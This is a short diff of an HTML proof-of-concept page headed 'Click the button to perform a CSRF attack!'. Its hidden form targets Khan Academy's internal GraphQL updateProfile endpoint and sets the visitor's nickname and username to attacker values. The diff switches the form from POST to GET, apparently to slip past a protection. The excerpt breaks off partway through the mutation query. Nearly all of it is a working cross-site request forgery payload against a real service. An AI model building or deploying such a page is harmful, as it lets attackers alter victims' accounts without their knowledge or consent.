@@ -2,7 +2,7 @@
 <html>
 <body>
     <h1>Click the button to perform a CSRF attack!</h1>
-    <form id="csrfForm" action="https://www.khanacademy.org/api/internal/graphql/updateProfile?lang=en&_=240807-1626-6591bfdb76a6_1723107484284" method="POST">
+    <form id="csrfForm" action="https://www.khanacademy.org/api/internal/graphql/updateProfile?lang=en&_=240807-1626-6591bfdb76a6_1723107484284" method="GET">
         <input type="hidden" name="operationName" value="updateProfile">
         <input type="hidden" name="variables" value='{"bio":"","nickname":"AttackerNickname","username":"AttackerUsername"}'>
         <input type="hidden" name="query" value='mutation updateProfile($avatarName: String, $bio: String, $profileAccessLevel: ProfileAccessLevel, $nickname: String, $username: String) {
